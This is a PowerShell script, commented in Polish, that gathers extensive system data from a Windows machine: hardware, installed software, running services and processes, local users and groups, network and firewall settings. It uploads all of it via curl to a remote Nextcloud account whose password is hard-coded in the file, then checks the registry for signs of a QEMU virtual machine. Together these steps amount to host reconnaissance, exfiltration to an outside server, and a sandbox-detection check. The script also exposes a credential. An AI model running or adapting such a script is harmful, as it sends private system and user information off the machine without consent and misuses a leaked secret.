# Katalog na lokalnym systemie
$OutputDir = "VM_Config_Info"
if (-not (Test-Path $OutputDir)) {
    New-Item -Path $OutputDir -ItemType Directory
}

# Pobieranie informacji o systemie
Get-ComputerInfo | Out-File "$OutputDir\ComputerInfo.txt"
Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed | Out-File "$OutputDir\ProcessorInfo.txt"
Get-WmiObject -Class Win32_PhysicalMemory | Select-Object Manufacturer, Capacity, Speed | Out-File "$OutputDir\MemoryInfo.txt"
Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, MediaType | Out-File "$OutputDir\DiskInfo.txt"
Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed | Out-File "$OutputDir\NetworkAdapterInfo.txt"
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Out-File "$OutputDir\InstalledPrograms.txt"
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, Status | Out-File "$OutputDir\RunningServices.txt"
Get-Process | Select-Object Name, Id, CPU, WS | Out-File "$OutputDir\RunningProcesses.txt"
Get-LocalUser | Out-File "$OutputDir\LocalUsers.txt"
Get-LocalGroup | Out-File "$OutputDir\LocalGroups.txt"
Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias, AddressFamily, PrefixLength | Out-File "$OutputDir\NetworkInfo.txt"
Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction | Out-File "$OutputDir\FirewallSettings.txt"
(Get-CimInstance -ClassName win32_operatingsystem).LastBootUpTime | Out-File "$OutputDir\Uptime.txt"
try {
    Import-Module -Name PSWindowsUpdate -ErrorAction Stop
    Get-WindowsUpdate | Out-File "$OutputDir\WindowsUpdateInfo.txt"
} catch {
    Write-Output "PSWindowsUpdate module is not installed. Skipping Windows Update info." | Out-File "$OutputDir\WindowsUpdateInfo.txt"
}
$PSVersionTable | Out-File "$OutputDir\PSVersion.txt"
Get-WmiObject -Class Win32_ComputerSystem | Select-Object Manufacturer, Model | Out-File "$OutputDir\VirtualizationInfo.txt"
Write-Output "Script execution completed. Check the $OutputDir directory for output files."

# Ustawienia Nextcloud
$NextcloudURL = "https://cloud.juniorjpdj.pl/remote.php/dav/files/zordonbot/Data"
$NextcloudUser = "zordonbot"
$NextcloudPassword = "t8RLr-4ps3x-qJonD-7RF9r-5W55C"

# Ścieżka do cURL.exe - upewnij się, że masz cURL zainstalowany
$curlPath = "C:\Windows\System32\curl.exe"  # lub ścieżka do cURL, jeśli jest zainstalowany w innym miejscu

# Funkcja do przesyłania plików na Nextcloud za pomocą cURL
function Upload-ToNextcloud {
    param (
        [string]$filePath,
        [string]$nextcloudURL,
        [string]$nextcloudUser,
        [string]$nextcloudPassword
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)
    $uploadUrl = "$nextcloudURL/$fileName"

    # Użycie pełnej ścieżki do cURL
    & $curlPath -u ${nextcloudUser}:${nextcloudPassword} -T $filePath $uploadUrl -v
}

# Przesyłanie plików na Nextcloud
$files = Get-ChildItem -Path $OutputDir
foreach ($file in $files) {
    Upload-ToNextcloud -filePath $file.FullName -nextcloudURL $NextcloudURL -nextcloudUser $NextcloudUser -nextcloudPassword $NextcloudPassword
}

Write-Output "All files uploaded to Nextcloud."
$qemu = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
    if ($qemu -match "qemu")
        {
    
            $qemuvm = $true
    
        }
    
    if (!$qemuvm)
        {
        $qemu = Get-ItemProperty hklm:HARDWARE\DESCRIPTION\System\CentralProcessor\0 -Name ProcessorNameString
        if ($qemu -match "qemu")
            {
                $qemuvm = $true
            }
        }    

    if ($qemuvm)
        {
    
         "This is a Qemu machine."
    
        }
